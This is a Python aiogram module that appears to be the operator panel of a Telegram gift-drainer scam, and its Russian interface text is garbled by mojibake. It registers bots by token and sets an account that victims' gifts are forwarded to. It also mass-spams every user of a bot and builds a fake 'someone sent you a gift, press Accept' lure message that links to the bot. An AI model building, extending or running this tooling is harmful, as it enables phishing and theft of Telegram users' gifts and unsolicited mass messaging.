import asyncio
from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from models import ConnectedID, MainUser, Template, UserBot, UserBotClient
from user_webhook import start_user_bot
from main_menu import send_main_menu
from config import MANAGE_BOTS_PHOTO_URL, TEMPLATES_PHOTO_URL
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from asyncio import create_task, Semaphore, gather
from aiogram.exceptions import TelegramAPIError
from redis_client import redis_client as redis
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

router = Router()

# üë§ FSM –¥–ª—è —Ä–∞—Å—Å—ã–ª–∫–∏
class SpamState(StatesGroup):
    waiting_for_text = State()


class PreviewState(StatesGroup):
    waiting_for_gift_url = State()

# üë§ –ì–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è –±–æ—Ç–∞–º–∏
def get_bots_menu_keyboard() -> list[list[InlineKeyboardButton]]:
    return [
        [
            InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –±–æ—Ç–∞", callback_data="add_userbot"),
            InlineKeyboardButton(text="‚Äπ –ù–∞–∑–∞–¥", callback_data="go_back_main")
        ]
    ]


# üì∏ –û—Ç–ø—Ä–∞–≤–∫–∞ –º–µ–Ω—é —Å–æ —Å–ø–∏—Å–∫–æ–º –±–æ—Ç–æ–≤
async def send_bots_menu(
    target: types.Message | types.CallbackQuery,
    page: int = 0,
    telegram_id: int | None = None
):
    user_id = telegram_id if telegram_id is not None else target.from_user.id
    user, _ = await MainUser.get_or_create(telegram_id=user_id)
    bots = await UserBot.filter(owner=user)

    bots_per_page = 10
    paginated = bots[page * bots_per_page: (page + 1) * bots_per_page]

    bot_buttons = []
    for i in range(0, len(paginated), 2):
        row = [
            InlineKeyboardButton(
                text=f"@{b.username or '–ë–µ–∑ –∏–º–µ–Ω–∏'}",
                callback_data=f"bot:{b.id}"
            )
            for b in paginated[i:i + 2]
        ]
        bot_buttons.append(row)

    pagination_row = []
    if page > 0:
        pagination_row.append(
            InlineKeyboardButton(text="‚¨ÖÔ∏è", callback_data=f"bots:{page - 1}")
        )
    if (page + 1) * bots_per_page < len(bots):
        pagination_row.append(
            InlineKeyboardButton(text="‚û°Ô∏è", callback_data=f"bots:{page + 1}")
        )

    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="–î–æ–±–∞–≤–∏—Ç—å –±–æ—Ç–∞", callback_data="add_userbot"),
            InlineKeyboardButton(text="‚Äπ –ù–∞–∑–∞–¥", callback_data="go_back_main")
        ],
        *bot_buttons,
        pagination_row if pagination_row else []
    ])

    send_photo = (
        target.message.answer_photo
        if isinstance(target, types.CallbackQuery)
        else target.answer_photo
    )

    await send_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="<b>ü§ñ –£–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –±–æ—Ç–∞–º–∏:</b>",
        reply_markup=keyboard,
        parse_mode="HTML"  
    )

# üì¶ –û—Ç–∫—Ä—ã—Ç–∏–µ –º–µ–Ω—é –±–æ—Ç–æ–≤
@router.callback_query(F.data.startswith("bots"))
async def open_bots_menu(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    page = int(callback.data.split(":")[1]) if ":" in callback.data else 0
    await send_bots_menu(callback, page)
    await callback.answer()


# ‚ûï –ó–∞–ø—Ä–æ—Å —Ç–æ–∫–µ–Ω–∞ –¥–ª—è –¥–æ–±–∞–≤–ª–µ–Ω–∏—è –±–æ—Ç–∞
@router.callback_query(F.data == "add_userbot")
async def ask_token(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    await callback.message.answer("<b>üîê –í–≤–µ–¥–∏—Ç–µ —Ç–æ–∫–µ–Ω –±–æ—Ç–∞:</b>", parse_mode="HTML")
    await callback.answer()

# üîô –ù–∞–∑–∞–¥ –≤ –≥–ª–∞–≤–Ω–æ–µ –º–µ–Ω—é
@router.callback_query(F.data == "go_back_main")
async def go_back_main(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    await send_main_menu(callback.message)
    await callback.answer()


@router.message(F.text.regexp(r"^\d+:[\w-]{30,}$"))
async def handle_token(message: types.Message):
    token = message.text.strip()

    try:
        temp_bot = Bot(token=token)
        me = await temp_bot.get_me()
        username = me.username

        main_user, _ = await MainUser.get_or_create(telegram_id=message.from_user.id)

        # –ü–æ–ª—É—á–∞–µ–º –∏–ª–∏ —Å–æ–∑–¥–∞—ë–º user-–±–æ—Ç–∞
        user_bot, created = await UserBot.get_or_create(
            owner=main_user,
            token=token
        )

        # –û–±–Ω–æ–≤–ª—è–µ–º username –¥–∞–∂–µ –µ—Å–ª–∏ –±–æ—Ç —É–∂–µ –µ—Å—Ç—å
        user_bot.username = username
        await user_bot.save()

        if not created:
            await message.answer("<b>‚ùó –≠—Ç–æ—Ç –±–æ—Ç —É–∂–µ –±—ã–ª –¥–æ–±–∞–≤–ª–µ–Ω.</b>", parse_mode="HTML")
            return

        await start_user_bot(token)
        await message.answer("<b>‚úÖ –ë–æ—Ç –¥–æ–±–∞–≤–ª–µ–Ω.</b>", parse_mode="HTML")

        # –ü–æ–ª—É—á–∞–µ–º –¥–æ—Å—Ç—É–ø–Ω—ã–µ —à–∞–±–ª–æ–Ω—ã
        templates = await Template.filter(owner=main_user)
        if not templates:
            # –£–¥–∞–ª—è–µ–º –±–æ—Ç–∞ –∏ webhook
            try:
                await temp_bot.delete_webhook(drop_pending_updates=True)
            except:
                pass
            await user_bot.delete()

            await message.answer(
                "<b>‚ö†Ô∏è –£ –≤–∞—Å –Ω–µ—Ç —à–∞–±–ª–æ–Ω–æ–≤. –°–Ω–∞—á–∞–ª–∞ —Å–æ–∑–¥–∞–π—Ç–µ —à–∞–±–ª–æ–Ω –ø–µ—Ä–µ–¥ –¥–æ–±–∞–≤–ª–µ–Ω–∏–µ–º –±–æ—Ç–∞.</b>",
                parse_mode="HTML"
            )
            return

        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤—ã–±–æ—Ä —à–∞–±–ª–æ–Ω–∞
        buttons = [
            [InlineKeyboardButton(
                text=tpl.name,
                callback_data=f"choose_template:{tpl.id}:{user_bot.id}"
            )] for tpl in templates
        ]
        markup = InlineKeyboardMarkup(inline_keyboard=buttons)

        await message.answer_photo(
            photo=TEMPLATES_PHOTO_URL,
            caption="<b>üì¶ –í—ã–±–µ—Ä–∏—Ç–µ —à–∞–±–ª–æ–Ω, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å—Å—è —ç—Ç–∏–º –±–æ—Ç–æ–º:</b>",
            reply_markup=markup,
            parse_mode="HTML"
        )

    except Exception as e:
        await message.answer(f"<b>‚ùå –û—à–∏–±–∫–∞:</b>\n<code>{e}</code>", parse_mode="HTML")

@router.callback_query(F.data.startswith("choose_template:"))
async def choose_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("<b>‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.</b>", parse_mode="HTML")
        return

    template_id = int(parts[1])
    user_bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=user_bot_id)
    if not bot:
        await callback.message.answer("<b>‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
        return

    user, _ = await MainUser.get_or_create(telegram_id=callback.from_user.id)

    ids = await ConnectedID.filter(owner=user).order_by("-added_at")

    if not ids:
        try:
            temp_bot = Bot(token=bot.token)
            await temp_bot.delete_webhook(drop_pending_updates=True)
        except:
            pass

        await bot.delete()

        await callback.message.answer(
            "<b>‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –¥–æ–±–∞–≤—å—Ç–µ –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –ø–æ–¥–∞—Ä–∫–æ–≤ –≤ —Ä–∞–∑–¥–µ–ª–µ \"–ù–∞—Å—Ç—Ä–æ–π–∫–∏\".</b>",
            parse_mode="HTML"
        )
        await send_bots_menu(callback.message, telegram_id=callback.from_user.id)
        return

    bot.template_id = template_id
    await bot.save()

    buttons = [
        [InlineKeyboardButton(
            text=str(conn.telegram_id),
            callback_data=f"set_forward:{conn.telegram_id}:{bot.id}"
        )] for conn in ids
    ]
    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=TEMPLATES_PHOTO_URL,
        caption="<b>üîÅ –í—ã–±–µ—Ä–∏—Ç–µ –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –ø–æ–¥–∞—Ä–∫–æ–≤:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("set_forward:"))
async def set_forward_id(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.")
        return

    forward_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    bot.forward_to_id = forward_id
    await bot.save()

    await callback.message.answer("<b>‚úÖ –ê–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –ø—Ä–∏–≤—è–∑–∞–Ω.</b>", parse_mode="HTML")
    await send_bots_menu(callback.message, telegram_id=callback.from_user.id)


async def send_bot_info(callback: types.CallbackQuery, bot_id: int):
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner", "template")

    if not bot_data:
        await callback.message.answer("<b>‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
        return

    # –ü–æ–ª—É—á–∞–µ–º –∫–æ–ª–∏—á–µ—Å—Ç–≤–æ –∫–ª–∏–µ–Ω—Ç–æ–≤ —Å –ø—Ä–µ–º–∏—É–º–æ–º
    premium_count = await UserBotClient.filter(bot=bot_data, is_premium=1).count()

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [types.InlineKeyboardButton(text="–û–±–Ω–æ–≤–∏—Ç—å", callback_data=f"bot_refresh:{bot_id}")],
        [types.InlineKeyboardButton(text="–ò–∑–º–µ–Ω–∏—Ç—å —à–∞–±–ª–æ–Ω", callback_data=f"change_template:{bot_id}")],
        [types.InlineKeyboardButton(text="–ò–∑–º–µ–Ω–∏—Ç—å –ø–µ—Ä–µ–¥–∞—á—É", callback_data=f"change_forward:{bot_id}")],
        [types.InlineKeyboardButton(text="–ü—Ä–æ—Å–ø–∞–º–∏—Ç—å", callback_data=f"spam_bot:{bot_id}")],
        [types.InlineKeyboardButton(text="–°–æ–∑–¥–∞—Ç—å –ø—Ä–µ–≤—å—é", callback_data=f"create_preview:{bot_id}")],
        [types.InlineKeyboardButton(text="–£–¥–∞–ª–∏—Ç—å –±–æ—Ç–∞", callback_data=f"delete_bot_confirm:{bot_id}")],
        [types.InlineKeyboardButton(text="‚Äπ –ù–∞–∑–∞–¥", callback_data="bots:0")]
    ])

    template_name = "–Ω–µ –ø—Ä–∏–≤—è–∑–∞–Ω"
    if bot_data.template_id:
        template = await Template.get_or_none(id=bot_data.template_id)
        if template:
            template_name = template.name

    caption = (
        f"<b>ü§ñ –ë–æ—Ç:</b> <b>@{bot_data.username or '–±–µ–∑ –∏–º–µ–Ω–∏'}</b>\n"
        f"<b>üîê Token:</b>\n<code>{bot_data.token}</code>\n\n"
        f"<blockquote>"
        f"üìà <b>–ó–∞–ø—É—Å–∫–∏:</b> <b>{bot_data.launches}</b>\n"
        f"üöÄ <b>–ó–∞–ø—É—Å–∫–∏ –ø—Ä–µ–º–∏—É–º:</b> <b>{premium_count}</b>\n"
        f"üë• <b>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏—è:</b> <b>{bot_data.connection_count}</b>"
        f"</blockquote>\n\n"
        f"<b>üì¶ –®–∞–±–ª–æ–Ω:</b> <b>{template_name}</b>\n"
        f"<b>üéÅ –ü–µ—Ä–µ–¥–∞—ë—Ç –ø–æ–¥–∞—Ä–∫–∏ –Ω–∞:</b> <code>{bot_data.forward_to_id or '–Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω–æ'}</code>"
    )

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption=caption,
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("change_forward:"))
async def change_forward(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")

    if not bot_data:
        await callback.message.answer("<b>‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.</b>", parse_mode="HTML")
        return

    user = bot_data.owner
    connected_ids = await ConnectedID.filter(owner=user).order_by("-added_at")

    if not connected_ids:
        await callback.message.answer("<b>‚ö†Ô∏è –£ –≤–∞—Å –Ω–µ—Ç –ø–æ–¥–∫–ª—é—á—ë–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤.</b>", parse_mode="HTML")
        return

    buttons = [
        [InlineKeyboardButton(
            text=str(conn.telegram_id),
            callback_data=f"apply_new_forward:{conn.telegram_id}:{bot_id}"
        )] for conn in connected_ids
    ]
    buttons.append([
        InlineKeyboardButton(text="‚Äπ –ù–∞–∑–∞–¥", callback_data=f"bot:{bot_id}")
    ])

    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="<b>üéÅ –í—ã–±–µ—Ä–∏—Ç–µ –Ω–æ–≤—ã–π –∞–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –ø–æ–¥–∞—Ä–∫–æ–≤:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("apply_new_forward:"))
async def apply_new_forward(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.")
        return

    forward_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    bot.forward_to_id = forward_id
    await bot.save()

    await callback.message.answer("<b>‚úÖ –ê–∫–∫–∞—É–Ω—Ç –¥–ª—è –ø–µ—Ä–µ–¥–∞—á–∏ –æ–±–Ω–æ–≤–ª—ë–Ω.</b>", parse_mode="HTML")
    await send_bot_info(callback, bot_id)


@router.callback_query(F.data.startswith("delete_bot_confirm:"))
async def confirm_delete_bot(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚úÖ –î–∞", callback_data=f"delete_bot_yes:{bot_id}")],
        [InlineKeyboardButton(text="‚ùå –ù–µ—Ç", callback_data=f"bot:{bot_id}")]
    ])

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="‚ö†Ô∏è –í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ <b>—É–¥–∞–ª–∏—Ç—å</b> —ç—Ç–æ–≥–æ –±–æ—Ç–∞?",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("delete_bot_yes:"))
async def delete_bot(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id)

    if not bot_data:
        await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    try:
        # –£–¥–∞–ª—è–µ–º Webhook
        temp_bot = Bot(token=bot_data.token)
        await temp_bot.delete_webhook()
        await temp_bot.session.close()
    except Exception as e:
        await callback.message.answer(f"‚ö†Ô∏è –ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å Webhook:\n<code>{e}</code>")

    # –£–¥–∞–ª—è–µ–º –∫–ª–∏–µ–Ω—Ç–æ–≤ —ç—Ç–æ–≥–æ –±–æ—Ç–∞
    await UserBotClient.filter(bot=bot_data).delete()

    # –£–¥–∞–ª—è–µ–º —Å–∞–º–æ–≥–æ –±–æ—Ç–∞
    await bot_data.delete()

    await callback.message.answer("<b>‚úÖ –ë–æ—Ç —É—Å–ø–µ—à–Ω–æ —É–¥–∞–ª—ë–Ω.</b>", parse_mode="HTML")
    await send_bots_menu(callback.message)

@router.callback_query(F.data.startswith("change_template:"))
async def change_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")

    if not bot_data:
        await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    templates = await Template.filter(owner=bot_data.owner)

    if not templates:
        await callback.message.answer("‚ùó –£ –≤–∞—Å –Ω–µ—Ç —à–∞–±–ª–æ–Ω–æ–≤.")
        return

    buttons = [
        [InlineKeyboardButton(
            text=tpl.name,
            callback_data=f"apply_new_template:{tpl.id}:{bot_id}"
        )] for tpl in templates
    ]

    markup = InlineKeyboardMarkup(inline_keyboard=buttons)

    await callback.message.answer_photo(
        photo=TEMPLATES_PHOTO_URL,
        caption="<b>üì¶ –í—ã–±–µ—Ä–∏—Ç–µ –Ω–æ–≤—ã–π —à–∞–±–ª–æ–Ω –¥–ª—è —ç—Ç–æ–≥–æ –±–æ—Ç–∞:</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

@router.callback_query(F.data.startswith("apply_new_template:"))
async def apply_new_template(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    parts = callback.data.split(":")
    if len(parts) != 3:
        await callback.message.answer("‚ùå –ù–µ–≤–µ—Ä–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.")
        return

    template_id = int(parts[1])
    bot_id = int(parts[2])

    bot = await UserBot.get_or_none(id=bot_id)
    if not bot:
        await callback.message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–≤—ã–π —à–∞–±–ª–æ–Ω
    bot.template_id = template_id
    await bot.save()

    await callback.message.answer("<b>‚úÖ –®–∞–±–ª–æ–Ω —É—Å–ø–µ—à–Ω–æ –æ–±–Ω–æ–≤–ª—ë–Ω.</b>", parse_mode="HTML")
    await send_bot_info(callback, bot_id)



@router.callback_query(F.data.startswith("bot:"))
async def handle_bot_details(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await send_bot_info(callback, bot_id)
    await callback.answer()


@router.callback_query(F.data.startswith("spam_bot:"))
async def ask_spam_text(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await state.update_data(bot_id=bot_id, chat_id=callback.message.chat.id)

    markup = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="‚Äπ –ù–∞–∑–∞–¥", callback_data=f"bot:{bot_id}")]
    ])

    await callback.message.answer_photo(
        photo=MANAGE_BOTS_PHOTO_URL,
        caption="‚úçÔ∏è <b>–ü—Ä–∏—à–ª–∏—Ç–µ —Ç–µ–∫—Å—Ç, –∫–æ—Ç–æ—Ä—ã–π –±—É–¥–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤—Å–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è–º —ç—Ç–æ–≥–æ user-–±–æ—Ç–∞.</b>",
        reply_markup=markup,
        parse_mode="HTML"
    )

    await state.set_state(SpamState.waiting_for_text)

@router.message(SpamState.waiting_for_text)
async def handle_spam_text(message: types.Message, state: FSMContext):
    data = await state.get_data()
    bot_id = data.get("bot_id")
    spam_text = f"<b>{message.text}</b>"

    await message.answer("‚è≥ <b>–†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞ –≤ —Ñ–æ–Ω–µ.</b>", parse_mode="HTML")

    create_task(run_spam(message, bot_id, spam_text))

    await state.clear()

async def run_spam(message: types.Message, bot_id: int, text: str):
    from redis_client import redis_client as redis

    bot_data = await UserBot.get_or_none(id=bot_id)
    if not bot_data:
        await message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω.")
        return

    user_bot = Bot(token=bot_data.token)
    users = await UserBotClient.filter(bot=bot_data)
    total = len(users)

    success_key = f"spam:{bot_id}:success"
    failed_key = f"spam:{bot_id}:failed"
    await redis.set(success_key, 0)
    await redis.set(failed_key, 0)

    semaphore = Semaphore(5)

    async def send_to_user(user):
        async with semaphore:
            try:
                await user_bot.send_message(chat_id=user.telegram_id, text=text, parse_mode="HTML")
                await redis.incr(success_key)
            except TelegramAPIError:
                await redis.incr(failed_key)
            await asyncio.sleep(0.3)

    await gather(*(send_to_user(user) for user in users))

    success = int(await redis.get(success_key) or 0)
    failed = int(await redis.get(failed_key) or 0)

    final_stats = (
        f"<b>üìä –†–∞—Å—Å—ã–ª–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞:</b>\n"
        f"<b>üë• –í—Å–µ–≥–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ–π:</b> <b>{total}</b>\n"
        f"<b>‚úÖ –£—Å–ø–µ—à–Ω–æ:</b> <b>{success}</b>\n"
        f"<b>‚ùå –ù–µ—É–¥–∞—á–Ω–æ:</b> <b>{failed}</b>"
    )

    try:
        await message.answer(final_stats, parse_mode="HTML")
    except Exception as e:
        print(f"[SPAM STATS ERROR] {e}")

    await redis.delete(success_key)
    await redis.delete(failed_key)

@router.callback_query(F.data.startswith("create_preview:"))
async def handle_create_preview(callback: types.CallbackQuery, state: FSMContext):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await state.update_data(bot_id=bot_id)

    await callback.message.answer("<b>üîó –ü—Ä–∏—à–ª–∏—Ç–µ —Å—Å—ã–ª–∫—É –Ω–∞ –ø–æ–¥–∞—Ä–æ–∫ (https://t.me/nft/...)</b>", parse_mode="HTML")
    await state.set_state(PreviewState.waiting_for_gift_url)

@router.message(PreviewState.waiting_for_gift_url)
async def handle_gift_url(message: types.Message, state: FSMContext):
    url = message.text.strip()
    if not url.startswith("https://t.me/nft/"):
        await message.answer("<b>‚ùå –°—Å—ã–ª–∫–∞ –¥–æ–ª–∂–Ω–∞ –Ω–∞—á–∏–Ω–∞—Ç—å—Å—è —Å https://t.me/nft/</b>", parse_mode="HTML")
        return

    data = await state.get_data()
    bot_id = data.get("bot_id")

    bot_data = await UserBot.get_or_none(id=bot_id).prefetch_related("owner")
    if not bot_data or not bot_data.token or not bot_data.username or not bot_data.owner:
        await message.answer("‚ùå –ë–æ—Ç –Ω–µ –Ω–∞–π–¥–µ–Ω –∏–ª–∏ –Ω–µ–ø–æ–ª–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ.", parse_mode="HTML")
        await state.clear()
        return

    gift_code = url.rsplit("/", 1)[-1]
    gift_name = gift_code.replace("-", " #")

    message_text = (
        f"üéÅ <b><a href='{url}'>{gift_name}</a></b>\n\n"
        f"<i>–ö—Ç–æ-—Ç–æ —Ä–µ—à–∏–ª –≤–∞—Å –ø–æ—Ä–∞–¥–æ–≤–∞—Ç—å ‚Äî –ø–æ–ª—É—á–∏—Ç—å —Å–≤–æ–π –ø–æ–¥–∞—Ä–æ–∫ –Ω–∞–∂–∞–≤ \"–ü—Ä–∏–Ω—è—Ç—å\"</i>"
    )

    markup = InlineKeyboardMarkup(inline_keyboard=[[ 
        InlineKeyboardButton(
            text="üéÅ –ü—Ä–∏–Ω—è—Ç—å",
            url=f"https://t.me/{bot_data.username}?start"
        )
    ]])

    try:
        # ‚úÖ –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è user-–±–æ—Ç–∞ —Å –ø—Ä–∞–≤–∏–ª—å–Ω—ã–º default=parse_mode
        user_bot = Bot(
            token=bot_data.token,
            default=DefaultBotProperties(parse_mode=ParseMode.HTML)
        )
        await user_bot.send_message(
            chat_id=bot_data.owner.telegram_id,
            text=message_text,
            reply_markup=markup,
            disable_web_page_preview=False
        )
    except Exception as e:
        await message.answer(
            f"<b>‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —á–µ—Ä–µ–∑ user-–±–æ—Ç–∞:</b>\n<code>{e}</code>",
            parse_mode="HTML"
        )

    await state.clear()

@router.callback_query(F.data.startswith("bot_refresh:"))
async def refresh_bot_info(callback: types.CallbackQuery):
    try:
        await callback.message.delete()
    except:
        pass

    bot_id = int(callback.data.split(":")[1])
    await send_bot_info(callback, bot_id)
    await callback.answer()